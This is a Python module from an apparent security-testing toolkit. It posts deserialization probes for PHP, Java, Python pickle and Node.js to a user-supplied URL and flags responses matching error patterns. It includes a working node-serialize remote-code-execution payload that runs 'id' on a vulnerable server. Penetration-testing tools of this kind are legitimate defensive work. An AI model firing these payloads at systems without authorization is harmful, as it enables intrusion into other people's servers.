# -*- coding: utf-8 -*-
"""MEOW-SEC :: DESERIA — Deserialization Vulnerability Tester"""
import os, re, json, base64, time
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False


def _save(name, target, results):
    os.makedirs("data", exist_ok=True)
    fname = f"data/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")


# ─── PHP Deserialization Payloads ─────────────────────────────
_PHP_PAYLOADS = [
    ("PHP stdClass",        b'O:8:"stdClass":0:{}',                   "application/x-www-form-urlencoded"),
    ("PHP stdClass b64",    base64.b64encode(b'O:8:"stdClass":0:{}'), "application/x-www-form-urlencoded"),
    ("PHP Nested object",   b'O:7:"exploit":1:{s:4:"data";s:4:"test";}', "application/x-www-form-urlencoded"),
]

_PHP_ERROR_PATTERNS = [
    r"__wakeup",
    r"__destruct",
    r"unserialize\(",
    r"Cannot use object",
    r"Unsupported operand",
    r"Call to a member function",
]

# ─── Java Deserialization ──────────────────────────────────────
# Java serialization magic: AC ED 00 05
_JAVA_MAGIC = base64.b64encode(bytes([0xAC, 0xED, 0x00, 0x05, 0x73, 0x72]))  # sr prefix
_JAVA_PAYLOADS = [
    ("Java serial magic",   _JAVA_MAGIC,  "application/x-java-serialized-object"),
    ("Java b64 body",       _JAVA_MAGIC,  "application/octet-stream"),
]

_JAVA_ERROR_PATTERNS = [
    r"ClassNotFoundException",
    r"ObjectInputStream",
    r"deserializ",
    r"CommonsCollections",
    r"java\.io\.",
    r"serialVersionUID",
]

# ─── Python Pickle ────────────────────────────────────────────
# Pickle magic: \x80\x04 (protocol 4)
_PICKLE_MAGIC = base64.b64encode(bytes([0x80, 0x04, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x2e]))
_PICKLE_PAYLOADS = [
    ("Python pickle",       _PICKLE_MAGIC, "application/octet-stream"),
    ("Pickle b64",          _PICKLE_MAGIC, "application/x-pickle"),
]

_PICKLE_ERROR_PATTERNS = [
    r"unpickling",
    r"pickle",
    r"_pickle",
    r"REDUCE",
]

# ─── Node.js node-serialize ───────────────────────────────────
_NODE_PAYLOAD = b'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}'
_NODE_PAYLOADS = [
    ("node-serialize RCE",  _NODE_PAYLOAD, "application/json"),
]

_NODE_ERROR_PATTERNS = [
    r"_\$\$ND_FUNC\$\$_",
    r"Cannot read propert",
    r"SyntaxError",
    r"uid=\d+",
]


def _test_endpoint(url, payload_bytes, content_type, timeout=12):
    """POST raw payload, return (status, body, elapsed)."""
    hdrs = {"Content-Type": content_type, "User-Agent": "MEOW-DESERIA/1.1"}
    try:
        t0 = time.time()
        if isinstance(payload_bytes, bytes) and content_type == "application/x-www-form-urlencoded":
            data = b"data=" + payload_bytes
        else:
            data = payload_bytes
        r = _req.post(url, data=data, headers=hdrs,
                      verify=False, allow_redirects=False, timeout=timeout)
        elapsed = time.time() - t0
        return r.status_code, r.text[:1000], elapsed
    except _req.exceptions.Timeout:
        return -1, "TIMEOUT", timeout
    except Exception as e:
        return 0, str(e)[:80], 0


def _detect(body, patterns):
    for pat in patterns:
        if re.search(pat, body, re.IGNORECASE):
            return re.search(pat, body, re.IGNORECASE).group(0)[:60]
    return ""


def run():
    show_module_banner("deseria")
    cat_talk(CAT_SCAN, "Deserialization tester — PHP / Java / Python / Node.js", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Install it: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL (endpoint that processes user data)[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    console.print()
    info("Testing PHP, Java, Python pickle, Node.js deserialization...")
    console.print()

    results = []

    all_tests = [
        ("PHP",    _PHP_PAYLOADS,    _PHP_ERROR_PATTERNS),
        ("Java",   _JAVA_PAYLOADS,   _JAVA_ERROR_PATTERNS),
        ("Pickle", _PICKLE_PAYLOADS, _PICKLE_ERROR_PATTERNS),
        ("NodeJS", _NODE_PAYLOADS,   _NODE_ERROR_PATTERNS),
    ]

    for platform, payloads, error_patterns in all_tests:
        info(f"Testing [{G1}]{platform}[/] deserialization...")
        for pname, payload_bytes, ctype in payloads:
            if isinstance(payload_bytes, str):
                payload_bytes = payload_bytes.encode()
            status, body, elapsed = _test_endpoint(url, payload_bytes, ctype)
            evidence = _detect(body, error_patterns)
            timed_out = (status == -1)
            has_error_500 = (status == 500)
            vuln = bool(evidence) or timed_out or has_error_500
            sev  = "POTENTIAL" if vuln else "SAFE"
            note = ""
            if evidence:  note = f"pattern: {evidence}"
            elif timed_out: note = "timeout (blind?)"
            elif has_error_500: note = "500 server error"
            results.append({
                "platform": platform, "payload": pname,
                "status": status, "elapsed": elapsed,
                "severity": sev, "evidence": evidence,
                "note": note
            })
            if vuln:
                find(f"[{platform}] [{RD}]{sev}[/] {pname} — {note}")

    # Display table
    console.print()
    t = Table(title=f"[{G1}]Deserialization Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
              border_style=G2, header_style=CY)
    t.add_column("Platform", min_width=8)
    t.add_column("Payload",  min_width=22)
    t.add_column("Status",   min_width=7)
    t.add_column("Severity", min_width=10)
    t.add_column("Note",     min_width=30)

    sc_map = {"POTENTIAL": RD, "SAFE": G2}
    for r in results:
        sc = sc_map.get(r["severity"], DM)
        t.add_row(r["platform"], r["payload"], str(r["status"]),
                  f"[{sc}]{r['severity']}[/]", r["note"])
    console.print(t)

    potentials = [r for r in results if r["severity"] == "POTENTIAL"]
    if potentials:
        find(f"{len(potentials)} potential deserialization issue(s)!")
    else:
        ok("No deserialization indicators found.")

    _save("deseria", url, results)
